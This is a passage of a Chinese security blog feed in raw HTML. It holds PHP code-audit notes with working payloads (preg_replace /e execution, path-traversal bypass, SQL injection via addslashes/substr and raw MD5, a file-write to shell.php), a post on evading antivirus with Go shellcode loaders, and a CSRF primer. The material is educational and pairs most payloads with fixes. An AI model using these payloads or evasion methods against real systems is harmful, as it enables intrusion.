class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>, &#123;$&#123;<span class="title function_ invoke__">phpinfo</span>()&#125;&#125;);</span><br></pre></td></tr></table></figure><p>但是这个payload是有问题的</p><p>以**.<em><strong>作为参数名是非法的，会自动转化成</strong>_</em>**</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204231609346.png"></p><p>图片来自：<a href="https://www.cnblogs.com/HelloCTF/p/13184476.html">https://www.cnblogs.com/HelloCTF/p/13184476.html</a></p><p>稍微修改以下payload即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\S*=<span class="variable">$&#123;phpinfo()&#125;</span></span><br></pre></td></tr></table></figure><p><strong>\S</strong>* 正则匹配任意多个非空白符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`\C`、`\D`、`\H`、`\N`、`\S`、`\V`、`\X` 都能代替</span><br></pre></td></tr></table></figure><p>匹配到 <strong>{${phpinfo()}}</strong> 或者 <strong>${phpinfo()}</strong> ，才能执行 phpinfo 函数，这是一个小坑。这实际上是 PHP可变变量 的原因。在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$a</span> = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;a=<span class="subst">$a</span>&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;a=$a&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=hello </span><br><span class="line">a=<span class="variable">$a</span></span><br></pre></td></tr></table></figure><p>为什么要匹配到 <strong>{${phpinfo()}}</strong> 或者 <strong>${phpinfo()}</strong> ，才能执行 <strong>phpinfo</strong> 函数，这是一个小坑。这实际上是 <a href="http://php.net/manual/zh/language.variables.variable.php">PHP可变变量</a> 的原因。在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。 <strong>${phpinfo()}</strong> 中的 <strong>phpinfo()</strong> 会被当做变量先执行，执行后，即变成 <strong>${1}</strong> (phpinfo()成功执行返回true)。</p><h4 id="利用场景：-7"><a href="#利用场景：-7" class="headerlink" title="利用场景："></a>利用场景：</h4><p>PHP版本有限制，可能见到的机会不多。</p><p>ctf出现过作为考点的题目</p><h4 id="修复建议：-7"><a href="#修复建议：-7" class="headerlink" title="修复建议："></a>修复建议：</h4><p>避免使用 <strong>&#x2F;e</strong> 模式修正符</p><h3 id="str-replace函数过滤不当"><a href="#str-replace函数过滤不当" class="headerlink" title="str_replace函数过滤不当"></a>str_replace函数过滤不当</h3><p>[<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day9/files/README.md">红日安全]代码审计Day9 - str_replace函数过滤不当</a></p><blockquote><p><a href="http://php.net/manual/zh/function.str-replace.php"> str_replace </a>：(PHP 4, PHP 5, PHP 7)</p><p><strong>功能</strong> ：子字符串替换</p><p><strong>定义</strong> ： <code>mixed str_replace ( mixed $search , mixed $replace , mixed $subject [, int &amp;$count ] )</code></p><p>该函数返回一个字符串或者数组。如下：</p><p>str_replace(字符串1，字符串2，字符串3)：将字符串3中出现的所有字符串1换成字符串2。</p><p>str_replace(数组1，字符串1，字符串2)：将字符串2中出现的所有数组1中的值，换成字符串1。</p><p>str_replace(数组1，数组2，字符串1)：将字符串1中出现的所有数组1一一对应，替换成数组2的值，多余的替换成空字符串。</p></blockquote><p>本质是过滤不严谨</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204231919587.png"></p><p>以上代码是将 <strong>..&#x2F;</strong> 字符替换成空，然后进行路径拼接</p><p>payload：**….&#x2F;&#x2F;** 或者 <strong>…&#x2F;.&#x2F;</strong> ，在经过程序的 <strong>str_replace</strong> 函数处理后，都会变成 <strong>..&#x2F;</strong> </p><h4 id="利用场景：-8"><a href="#利用场景：-8" class="headerlink" title="利用场景："></a>利用场景：</h4><p>任意文件读取，任意文件删除……</p><h4 id="修复建议：-8"><a href="#修复建议：-8" class="headerlink" title="修复建议："></a>修复建议：</h4><p>结合业务场景进行过滤</p><h3 id="程序未恰当exit导致的问题"><a href="#程序未恰当exit导致的问题" class="headerlink" title="程序未恰当exit导致的问题"></a>程序未恰当exit导致的问题</h3><p>[<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day10/files/README.md">红日安全]代码审计Day10 - 程序未恰当exit导致的问题</a></p><p>本质上代码逻辑有问题，在本应该立即exit退出的地方，没有退出函数，使得程序继续运行，出现非预期的情况。</p><h4 id="利用场景：-9"><a href="#利用场景：-9" class="headerlink" title="利用场景："></a>利用场景：</h4><p>重装漏洞</p><h4 id="修复建议：-9"><a href="#修复建议：-9" class="headerlink" title="修复建议："></a>修复建议：</h4><p>在正确的地方退出程序即可，使用 <strong>die</strong> 、 <strong>exit</strong> 等函数。</p><h3 id="unserialize反序列化漏洞"><a href="#unserialize反序列化漏洞" class="headerlink" title="unserialize反序列化漏洞"></a>unserialize反序列化漏洞</h3><p>[<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day11/files/README.md">红日安全]代码审计Day11 - unserialize反序列化漏洞</a></p><p>这个可以说是打ctf之前经常能见到。</p><p>这里直接推几篇文章</p><p>这一篇就够了</p><p><a href="https://blog.csdn.net/solitudi/article/details/113588692">https://blog.csdn.net/solitudi/article/details/113588692</a></p><h4 id="利用场景：-10"><a href="#利用场景：-10" class="headerlink" title="利用场景："></a>利用场景：</h4><p>构造POP链rce</p><p>ctf</p><h4 id="修复建议：-10"><a href="#修复建议：-10" class="headerlink" title="修复建议："></a>修复建议：</h4><p>不要把用户的输入或者是用户可控的参数值直接放进反序列化的操作中</p><h3 id="误用htmlentities函数引发的漏洞"><a href="#误用htmlentities函数引发的漏洞" class="headerlink" title="误用htmlentities函数引发的漏洞"></a>误用htmlentities函数引发的漏洞</h3><p>[<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day12/files/README.md">红日安全]代码审计Day12 - 误用htmlentities函数引发的漏洞</a></p><blockquote><p><a href="http://php.net/manual/zh/function.htmlentities.php">htmlentities</a> — 将字符转换为 HTML 转义字符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">htmlentities</span> ( <span class="keyword">string</span> <span class="variable">$string</span> [, <span class="keyword">int</span> <span class="variable">$flags</span> = ENT_COMPAT | ENT_HTML401 [, <span class="keyword">string</span> <span class="variable">$encoding</span> = <span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;default_charset&quot;</span>) [, <span class="keyword">bool</span> <span class="variable">$double_encode</span> = <span class="literal">true</span> ]]] )</span><br></pre></td></tr></table></figure><p>作用：在写PHP代码时，不能在字符串中直接写实体字符，PHP提供了一个将HTML特殊字符转换成实体字符的函数 htmlentities()。</p></blockquote><p>注：<strong>htmlentities()</strong> 并不能转换所有的特殊字符，是转换除了空格之外的特殊字符，且单引号和双引号需要单独控制（通过第二个参数）。第2个参数取值有3种，分别如下：</p><ul><li>ENT_COMPAT（默认值）：只转换双引号。</li><li>ENT_QUOTES：两种引号都转换。</li><li>ENT_NOQUOTES：两种引号都不转换。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204231947807.png"></p><h4 id="利用场景：-11"><a href="#利用场景：-11" class="headerlink" title="利用场景："></a>利用场景：</h4><p>当参数没设置清楚会导致出现SQL注入、XSS。</p><h4 id="修复建议：-11"><a href="#修复建议：-11" class="headerlink" title="修复建议："></a>修复建议：</h4><p><strong>htmlentities</strong> 这个函数使用的时候，尽量加上可选参数，并且选择 <strong>ENT_QUOTES</strong> 转换单引号和双引号 参数。</p><h3 id="特定场合下addslashes函数的绕过"><a href="#特定场合下addslashes函数的绕过" class="headerlink" title="特定场合下addslashes函数的绕过"></a>特定场合下addslashes函数的绕过</h3><p>[<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day13/files/README.md">红日安全]代码审计Day13 - 特定场合下addslashes函数的绕过</a></p><blockquote><p><a href="http://php.net/manual/zh/function.addslashes.php">addslashes</a> — 使用反斜线引用字符串</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">string</span> addslashes ( <span class="built_in">string</span> $str )</span><br></pre></td></tr></table></figure><p>作用：在单引号（’）、双引号（”）、反斜线（\）与 NULL（ <strong>NULL</strong> 字符）字符之前加上反斜线。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204231952107.png"></p><p>具体案例：</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204231956690.png"></p><p>代码 <strong>第33行</strong> ，通过 <strong>POST</strong> 方式传入 <strong>user</strong> 和 <strong>passwd</strong> 两个参数，通过 <strong>isValid()</strong> 来判断登陆是否合法。我们跟进一下 <strong>isValid()</strong> 这个函数，该函数主要功能代码在 <strong>第12行-第22行</strong> ，我们看到 <strong>13行</strong> 和 <strong>14行</strong> 调用 <strong>sanitizeInput()</strong> 针对 <strong>user</strong> 和 <strong>password</strong> 进行相关处理。</p><p>跟进一下 <strong>sanitizeInput()</strong> ，主要功能代码在 <strong>第24行-第29行</strong> ，这里针对输入的数据调用 <strong>addslashes</strong> 函数进行处理，然后再针对处理后的内容进行长度的判断，如果长度大于20，就只截取前20个字符。</p><p>滤了单引号，正常情况下是没有注入了，那为什么还能导致注入了，原因实际上出在了 <strong>substr</strong> 函数</p><blockquote><p><a href="http://php.net/manual/zh/function.substr.php">substr</a> — 返回字符串的子串</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">string</span> substr ( <span class="built_in">string</span> $string , <span class="built_in">int</span> $start [, <span class="built_in">int</span> $length ] )</span><br></pre></td></tr></table></figure><p>作用：返回字符串 <code>string</code> 由 <code>start</code> 和 <code>length</code> 参数指定的子字符串。</p></blockquote><p>代码中length默认为20</p><p>我们里可以用他默认的长度为20，设计一个payload</p><p>正常情况输入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=<span class="number">1234567890123456789</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>会被转换成</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=<span class="number">1234567890123456789</span>\<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>但是经过substr函数的截取</p><p>又变成了</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">user</span><span class="operator">=</span><span class="number">1234567890123456789</span>\</span><br></pre></td></tr></table></figure><p>再结合具体代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="title function_ invoke__">count</span>(p) <span class="keyword">from</span> user u where user = <span class="string">&#x27;1234567890123456789\&#x27; AND password = &#x27;</span><span class="variable">$pass</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>\将本来是用来闭合user的单引号转义成了正常的单引号，所以签名的单引号与$pass的前一个单引号进行了闭合。</p><p>这里我们让 <strong>pass&#x3D;or 1&#x3D;1#</strong> ，那么最后的sql语句如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="title function_ invoke__">count</span>(p) <span class="keyword">from</span> user where user = <span class="string">&#x27;1234567890123456789\&#x27; AND password = &#x27;</span><span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#&#x27;</span></span><br></pre></td></tr></table></figure><p>sql注入成功。</p><h4 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景:"></a>利用场景:</h4><p>白盒审计</p><p>ctf</p><h4 id="修复建议：-12"><a href="#修复建议：-12" class="headerlink" title="修复建议："></a>修复建议：</h4><p>结合程序逻辑进行代码优化。</p><h3 id="从变量覆盖到getshell"><a href="#从变量覆盖到getshell" class="headerlink" title="从变量覆盖到getshell"></a>从变量覆盖到getshell</h3><p>[<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day14/files/README.md">红日安全]代码审计Day14 - 从变量覆盖到getshell</a></p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204232044601.png"></p><p>在 <strong>第10-11行</strong> 处， <strong>Carrot</strong> 类的构造方法将超全局数组 <strong>$_GET</strong> 进行变量注册，这样即可覆盖 <strong>第8行</strong> 已定义的 <strong>$this-&gt;</strong> 变量。而在 <strong>第16行</strong> 处的析构函数中， <strong>file_put_contents</strong> 函数的第一个参数又是由 <strong>$this-&gt;</strong> 变量拼接的，这就导致我们可以控制写入文件的位置，最终造成任意文件写入问题。下面我们试着使用 <strong>payload</strong> ：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=../<span class="keyword">var</span>/www/html/shell.php&amp;shell=<span class="string">&#x27;,)%0a&lt;?php phpinfo();?&gt;//</span></span><br></pre></td></tr></table></figure><p>shell.php文件中内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span> =&gt; <span class="string">&#x27;../var/www/html/shell.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;lost&#x27;</span> =&gt; <span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;bought&#x27;</span> =&gt; <span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;shell&#x27;</span> =&gt; <span class="string">&#x27;\&#x27;,)</span></span><br><span class="line"><span class="string">&lt;?php phpinfo();?&gt;//&#x27;</span>,</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>这里注意，shell变量中的反斜杠\是自动加上的，是给我们传入shell参数的内容中的单引号转义的。</p><h4 id="利用场景：-12"><a href="#利用场景：-12" class="headerlink" title="利用场景："></a>利用场景：</h4><p>变脸覆盖的场景有写shell还有覆盖session登录等等</p><h4 id="修复建议：-13"><a href="#修复建议：-13" class="headerlink" title="修复建议："></a>修复建议：</h4><p>检测变量名是否为PHP原有的超全局数组，如果是则直接退出并告知变量不允许</p><h3 id="SERVER-‘PHP-SELF’-导致的防御失效问题"><a href="#SERVER-‘PHP-SELF’-导致的防御失效问题" class="headerlink" title="$_SERVER[‘PHP_SELF’]导致的防御失效问题"></a>$_SERVER[‘PHP_SELF’]导致的防御失效问题</h3><p>[<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day15/files/README.md">红日安全]代码审计Day15 - $_SERVER[‘PHP_SELF’]导致的防御失效问题</a></p><p>PHP自带的**$_SERVER[‘PHP_SELF’]** 参数是可以控制</p><p><strong>PHP_SELF</strong> 指当前的页面绝对地址，比如我们的网站：<a href="http://www.test.com/redict/index.php%EF%BC%8C%E9%82%A3%E4%B9%88**PHP_SELF**%E5%B0%B1%E6%98%AF">http://www.test.com/redict/index.php，那么**PHP_SELF**就是</a> &#x2F;redict&#x2F;index.php 。</p><p>但有个小问题很多人没有注意到，当<strong>URL</strong>是<strong>PATH_INFO</strong>的时候，比如：<a href="http://www.test.com/redict/index.php/admin%EF%BC%8C%E9%82%A3%E4%B9%88**PHP_SELF**%E5%B0%B1%E6%98%AF/redict/index.php/admin">http://www.test.com/redict/index.php/admin，那么**PHP_SELF**就是/redict/index.php/admin</a> 也就是说，其实 <strong>PHP_SELF</strong> 有一部分是我们可以控制的。</p><h4 id="利用场景：-13"><a href="#利用场景：-13" class="headerlink" title="利用场景："></a>利用场景：</h4><p>任意URL跳转</p><p>有一个关于 <strong>360webscan</strong> 的防护脚本一个历史漏洞，正是使用了 <strong>$_SERVER[‘PHP_SELF’]</strong> 这个变量，导致可以绕过360webscan防护脚本的防护，脚本的防护效果失效。</p><h4 id="修复建议：-14"><a href="#修复建议：-14" class="headerlink" title="修复建议："></a>修复建议：</h4><p>使用 <strong>$_SERVER[‘SCRIPT_NAME’]</strong> 代替即可</p><h3 id="深入理解-REQUESTS数组"><a href="#深入理解-REQUESTS数组" class="headerlink" title="深入理解$_REQUESTS数组"></a>深入理解$_REQUESTS数组</h3><p>[<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day16/files/README.md">红日安全]代码审计Day16 - 深入理解$_REQUESTS数组</a></p><p>超全局数组 <strong>$_REQUEST</strong> 中的数据，是 <strong>$_GET</strong> 、 <strong>$_POST</strong> 、 <strong>$_COOKIE</strong> 的合集，而且数据是复制过去的，并不是引用。</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204232129558.png"></p><p>所以很多时候仅仅是对**$_GET** 、 <strong>$_POST</strong>的传参做了限制，但利用时的变量确实使用**$_REQUEST**传入的，相当于并没有进行过滤。</p><h4 id="利用场景：-14"><a href="#利用场景：-14" class="headerlink" title="利用场景："></a>利用场景：</h4><p>XSS，SQL注入等</p><h4 id="修复建议：-15"><a href="#修复建议：-15" class="headerlink" title="修复建议："></a><strong>修复建议：</strong></h4><p>优化参数处理逻辑。</p><h3 id="Raw-MD5-Hash引发的注入"><a href="#Raw-MD5-Hash引发的注入" class="headerlink" title="Raw MD5 Hash引发的注入"></a>Raw MD5 Hash引发的注入</h3><p>[<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day17/files/README.md">红日安全]代码审计Day17 - Raw MD5 Hash引发的注入</a></p><blockquote><p><a href="http://php.net/manual/zh/function.md5.php">md5</a> — 计算字符串的 MD5 散列值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">md5</span> ( <span class="keyword">string</span> <span class="variable">$str</span> [, <span class="keyword">bool</span> <span class="variable">$raw_output</span> = <span class="literal">false</span> ] )</span><br></pre></td></tr></table></figure><p>如果可选的 <code>raw_output</code> 被设置为 <strong>TRUE</strong>，那么 MD5 报文摘要将以16字节长度的原始二进制格式返回。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204232133969.png"></p><p>案例：</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204232134254.png"></p><p>我可以控制的点有两个变量，一个是 <strong>$user</strong> ，一个是 <strong>$pass</strong> ，**$pass** 经过了 <strong>md5</strong> 的处理，但是返回字段不是标准的md5值，**$user** 经过了 <strong>addslashes</strong> 函数的处理，无法引入特殊符号去闭合。</p><p>如果我们经过 <strong>$pass &#x3D; md5($this-&gt;password, true);</strong> 处理之后的值逃逸出一个反斜杆，那么实际上带入到数据库的值就如下所示：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="title function_ invoke__">count</span>(p) <span class="keyword">from</span> user s where password=<span class="string">&#x27;xxxxxx\&#x27; and user=&#x27;</span>xxx<span class="comment">#&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204232135110.png" alt="3"></p><p>发现 <strong>md5(128, true)</strong> 最后的结果带有反斜杠。</p><p>payload如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user= OR <span class="number">1</span>=<span class="number">1</span><span class="comment">#&amp;passwd=128</span></span><br></pre></td></tr></table></figure><p>带入到数据库查询的语句如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="title function_ invoke__">count</span>(p) <span class="keyword">from</span> user s where password=<span class="string">&#x27;v�a�n���l���q��\&#x27; and user=&#x27;</span> OR <span class="number">1</span>=<span class="number">1</span><span class="comment">#&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="利用场景：-15"><a href="#利用场景：-15" class="headerlink" title="利用场景："></a>利用场景：</h4><p>CTF遇见过</p><h4 id="修复建议：-16"><a href="#修复建议：-16" class="headerlink" title="修复建议："></a>修复建议：</h4><p>建议在使用 <strong>md5</strong> 函数的时候，不要将 <strong>$raw_output</strong> 字段设置为<strong>true</strong> 。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SRC姿势(二)</title>
      <link href="/2022/04/17/SRC%E5%A7%BF%E5%8A%BF(%E4%BA%8C)/"/>
      <url>/2022/04/17/SRC%E5%A7%BF%E5%8A%BF(%E4%BA%8C)/</url>
      
        <content type="html"><![CDATA[<h1 id="SRC姿势-二"><a href="#SRC姿势-二" class="headerlink" title="SRC姿势(二)"></a>SRC姿势(二)</h1><p>新增漏洞银行分享和挖百度的大佬的分享</p><p>未来将会收集点国外赏金猎人的思路。</p><p>github地址：<a href="https://github.com/LiAoRJ/src">LiAoRJ&#x2F;src: SRC姿势收集 (github.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> SRC姿势 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SRC姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>go免杀思路研究</title>
      <link href="/2022/04/16/go%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF%E7%A0%94%E7%A9%B6/"/>
      <url>/2022/04/16/go%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF%E7%A0%94%E7%A9%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="go免杀思路研究"><a href="#go免杀思路研究" class="headerlink" title="go免杀思路研究"></a>go免杀思路研究</h1><p>今天看了几个Go语言的免杀项目，由于这些项目发布已经有些时间了，免杀效果早已大不如前，遂想将这几个项目核心思想结合一下，生成一个新的免杀项目，这里总结一下几个项目的核心思想：</p><ol><li><p>Syscall直接系统调用</p></li><li><p>shellcode远程加载（远程加载图片中的shellcode）</p></li><li><p>shellcode混淆加密（以Base64为例）</p></li><li><p>沙箱绕过</p></li><li><p>随机变量名生成</p><span id="more"></span></li></ol><p>参考的项目如下：</p><p><a href="https://github.com/pureqh/bypassAV">pureqh&#x2F;bypassAV: 免杀shellcode加载器 (github.com)</a></p><p><a href="https://github.com/Hangingsword/HouQing">Hangingsword&#x2F;HouQing (github.com)</a></p><p><a href="https://github.com/huadema/Gobypass">huadema&#x2F;Gobypass (github.com)</a></p><p>目前火绒没绕过去。。。这令我很吃惊，360、def完美落地，火绒我研究一下，源码比较拙劣，先不放了，放张打包成exe后的VT检测图</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204162227082.png"></p>]]></content>
      
      
      <categories>
          
          <category> 免杀研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀研究 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>重新研究一下CSRF的攻击与防御</title>
      <link href="/2022/04/14/%E9%87%8D%E6%96%B0%E7%A0%94%E7%A9%B6%E4%B8%80%E4%B8%8BCSRF%E7%9A%84%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/"/>
      <url>/2022/04/14/%E9%87%8D%E6%96%B0%E7%A0%94%E7%A9%B6%E4%B8%80%E4%B8%8BCSRF%E7%9A%84%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p><strong>定义：</strong></p><p>跨站请求伪造</p><p>挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法</p><span id="more"></span><p><strong>对比XSS：</strong> 跟跨网站脚本(XSS)相比，XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.用户C打开浏览器，访问受信任网站<span class="selector-tag">A</span>，输入用户名和密码请求登录网站<span class="selector-tag">A</span>;</span><br><span class="line"><span class="number">2</span>.在用户信息通过验证后，网站<span class="selector-tag">A</span>产生Cookie信息并返回给浏览器，此时用户登录网站<span class="selector-tag">A</span>成功，可以正常发送请求到网站<span class="selector-tag">A</span>;</span><br><span class="line"><span class="number">3</span>.用户未退出网站<span class="selector-tag">A</span>之前，在同一浏览器中，打开一个TAB页访问网站<span class="selector-tag">B</span>;</span><br><span class="line"><span class="number">4</span>.网站<span class="selector-tag">B</span>接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点<span class="selector-tag">A</span>;</span><br><span class="line"><span class="number">5</span>.浏览器在接收到这些攻击性代码后，根据网站<span class="selector-tag">B</span>的请求，在用户不知情的情况下携带Cookie信息，向网站<span class="selector-tag">A</span>发出请求。网站<span class="selector-tag">A</span>并不知道该请求其实是由<span class="selector-tag">B</span>发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站<span class="selector-tag">B</span>的恶意代码被执行。</span><br></pre></td></tr></table></figure><p><strong>要被CSRF攻击，必须同时满足两个条件：</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. 登录受信任网站<span class="selector-tag">A</span>，并在本地生成Cookie。</span><br><span class="line"><span class="number">2</span>. 在不登出<span class="selector-tag">A</span>的情况下，访问危险网站<span class="selector-tag">B</span>。</span><br></pre></td></tr></table></figure><h2 id="GET型CSRF"><a href="#GET型CSRF" class="headerlink" title="GET型CSRF"></a>GET型CSRF</h2><h5 id="乌云社区某删除功能存在CSRF漏洞（简单利用需诱骗管理员触发）"><a href="#乌云社区某删除功能存在CSRF漏洞（简单利用需诱骗管理员触发）" class="headerlink" title="乌云社区某删除功能存在CSRF漏洞（简单利用需诱骗管理员触发）"></a>乌云社区某删除功能存在CSRF漏洞（简单利用需诱骗管理员触发）</h5><p><a href="https://wooyun.website/show.php?uid=S8XttXpbELTcgJTjRpr0Gq6dLdNmnRagM9rJmzPt">https://wooyun.website/show.php?uid=S8XttXpbELTcgJTjRpr0Gq6dLdNmnRagM9rJmzPt</a></p><h5 id="新浪微博某处小功能存在CSRF漏洞（可修改用户微博某元素）"><a href="#新浪微博某处小功能存在CSRF漏洞（可修改用户微博某元素）" class="headerlink" title="新浪微博某处小功能存在CSRF漏洞（可修改用户微博某元素）"></a>新浪微博某处小功能存在CSRF漏洞（可修改用户微博某元素）</h5><p><a href="https://wooyun.website/show.php?uid=6HimWDmTrwk2d0kEhtwey5NJihxQEID4pPWgrsWp">https://wooyun.website/show.php?uid=6HimWDmTrwk2d0kEhtwey5NJihxQEID4pPWgrsWp</a></p><h2 id="POST型CSRF"><a href="#POST型CSRF" class="headerlink" title="POST型CSRF"></a>POST型CSRF</h2><h5 id="中国网络电视台官方CSRF刷微博粉"><a href="#中国网络电视台官方CSRF刷微博粉" class="headerlink" title="中国网络电视台官方CSRF刷微博粉"></a>中国网络电视台官方CSRF刷微博粉</h5><p><a href="https://wooyun.website/show.php?uid=pmxEDefy2wx977fTMeNj9NCHGkxJ5eTMh3pUlXPh">https://wooyun.website/show.php?uid=pmxEDefy2wx977fTMeNj9NCHGkxJ5eTMh3pUlXPh</a></p><h5 id="新浪微博csrf刷粉丝"><a href="#新浪微博csrf刷粉丝" class="headerlink" title="新浪微博csrf刷粉丝"></a>新浪微博csrf刷粉丝</h5><p><a href="https://wooyun.website/show.php?uid=eUTLauXnYMYB2oRcmcV6F4krh3q0HyGJF9IcMnyC">https://wooyun.website/show.php?uid=eUTLauXnYMYB2oRcmcV6F4krh3q0HyGJF9IcMnyC</a></p><h2 id="补充一点东西"><a href="#补充一点东西" class="headerlink" title="补充一点东西"></a>补充一点东西</h2><h4 id="GET-CSRF使用方法"><a href="#GET-CSRF使用方法" class="headerlink" title="GET CSRF使用方法"></a>GET CSRF使用方法</h4><p>GET请求不一定必须限制为FORM表单，JS请求进行提交，img、iframe、link等标签，css属性都可以进行GET请求</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1. script标签利用</span><br><span class="line">&lt;a <span class="attribute">href</span>=<span class="string">&quot;恶意CSRF_URL&quot;</span>&gt;请点击我</span><br><span class="line">2. iframe利用</span><br><span class="line">&lt;iframe <span class="attribute">src</span>=<span 